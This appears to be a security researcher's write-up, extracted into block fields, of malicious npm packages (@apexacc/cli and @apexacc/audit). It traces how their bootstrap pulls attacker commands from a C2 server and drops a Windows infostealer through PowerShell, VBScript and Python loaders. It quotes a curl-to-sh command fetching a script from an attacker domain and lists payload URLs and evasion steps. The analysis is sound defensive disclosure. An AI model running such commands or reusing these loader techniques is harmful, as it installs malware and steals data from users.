blocks.text: Malicious npm packages and delivery chains
blocks.section: Malicious npm packages and delivery chains

blocks.text: Their published launchers download and start platform-specific executables from the projects’ GitHub releases. The associated source implements a separate “verification” path that obtains commands from vrf.apexaccs[.]org and launches them on the host. Windows-specific code also attempts to alter execution policy and security controls.

blocks.text: How the bootstrap runs attacker commands on Windows and macOS
blocks.section: How the bootstrap runs attacker commands on Windows and macOS

blocks.text: The two projects place their bootstrap logic in different files: @apexacc/cli uses packages/coding-agent/src/apex-bootstrap.ts, while @apexacc/audit implements it in src/main.ts. Both use the same verification service, hxxps://vrf.apexaccs[.]org/api/v1/vrf, and accept server-selected exec, args, and cmd fields. The platform determines how that request and command execution occur:
blocks.section: How the bootstrap runs attacker commands on Windows and macOS

blocks.text: Windows: Direct command retrieval
blocks.section: Windows: Direct command retrieval

blocks.text: The @apexacc/cli bootstrap writes this command line into %TEMP%\_apex_run.ps1; @apexacc/audit writes it into %TEMP%\_audit_run.ps1. Each also writes a VBScript launcher (_apex_run.vbs or _audit_run.vbs in the same temporary directory) containing a WScript.Shell.Run call that starts powershell -NoProfile -ExecutionPolicy Bypass -File <path-to-ps1>. The bootstrap then launches wscript.exe with the VBScript file as its argument:
blocks.section: Windows: Direct command retrieval

blocks.text: macOS: Command fetching through a Rust verifier
blocks.section: macOS: Command fetching through a Rust verifier

blocks.text: For macOS, instead of making network requests directly from JavaScript, both packages delegate this step to a small Rust binary, apex-verify-darwin (copilot) / apex-audit-verify-darwin (audit-mcp). These binaries POST {"p":"darwin"} to vrf.apexaccs[.]org/api/v1/vrf to retrieve a command from the attacker's command-and-control (C2) server.
blocks.section: macOS: Command fetching through a Rust verifier

blocks.text: "cmd": "curl hxxps://verify.apexfdn[.]xyz/macos/installer/terminal/interactive/bash | sh",
blocks.section: macOS: Command fetching through a Rust verifier

blocks.text: This command downloads a remotely hosted bash script and executes it on the machine. The script masquerades as a generic application installer, but its real logic downloads a gzip-compressed tarball from the URL (verify.apexfdn[.]xyz/unix/ab640649-3889-4169-8804-2a1a8ba0fe72) and saves it as package.tar.gz in a temporary directory, in addition to extracting it:
blocks.section: macOS: Command fetching through a Rust verifier

blocks.text: The Windows infostealer chain, stage by stage
blocks.section: The Windows infostealer chain, stage by stage

blocks.text: Initial execution
blocks.section: Initial execution

blocks.text: Following the direct command-retrieval path, the malware submits a POST request with the body {"p":"win32"} to hxxps://vrf.apexaccs[.]org/api/v1/vrf to retrieve a Base64-encoded PowerShell command:
blocks.section: Initial execution

blocks.text: The decoded command constructs the endpoint 0auth-chromium[.]com/APIService and attempts to retrieve and execute its response. The response is a PowerShell script named drop.ps1, which downloads an executable from https://ehegisnightmare[.]icu/build/nTOugj-fWWMurYHg/bludness.exe and launches it in a hidden window:
blocks.section: Initial execution

blocks.text: Python first-stage loader and UAC bypass
blocks.section: Python first-stage loader and UAC bypass

blocks.text: Using tools like PyInstaller Extractor and PyLingual, we recovered and examined the embedded loader.py module. On a normal launch, the loader calls shell32.IsUserAnAdmin to check whether it already has administrator privileges. If so, it leaves a unique marker at %APPDATA%\.cobra and proceeds to the routine responsible for downloading and launching the next stage at hxxps://ehegisnightmare[.]icu/build/J2BkQFArlBUXf4MF/install.exe. The loader saves this payload as %TEMP%\exegis.exe.
blocks.section: Python first-stage loader and UAC bypass

blocks.text: Python second-stage loader and anti-virtual-machine (anti-VM) checks
blocks.section: Python second-stage loader and anti-virtual-machine (anti-VM) checks

blocks.text: After passing the checks, it uses an embedded Fernet key to decrypt a filename token, which resolves to loader.exe. It then uses that name to locate the bundled resource enc_loader.exe. Despite the executable extension, this resource remains plain encrypted data. The loader decrypts its contents using the same key and writes the resulting executable to %TEMP%\updater_loader.exe. It launches it through subprocess.run().
blocks.section: Python second-stage loader and anti-virtual-machine (anti-VM) checks

blocks.text: The unused Dropbox payload path
blocks.section: The unused Dropbox payload path

blocks.text: The infostealer also contains a Dropbox download-and-execute path set to hxxps://www.dropbox[.]com/scl/fi/tbxu5vgr9l1vuw3s7rw7v/VisualStudioSetup.exe?rlkey=o6dpwfynneuxeyok7g5trtv96&st=nj5jxsoe&dl=1. It saves the response as %TEMP%\visual.exe and attempts to launch it with no-console settings. It schedules deletion after 60 seconds. However, this appears to be a validly signed Microsoft Visual Studio 2022 Community installer bootstrapper, likely used as a front.
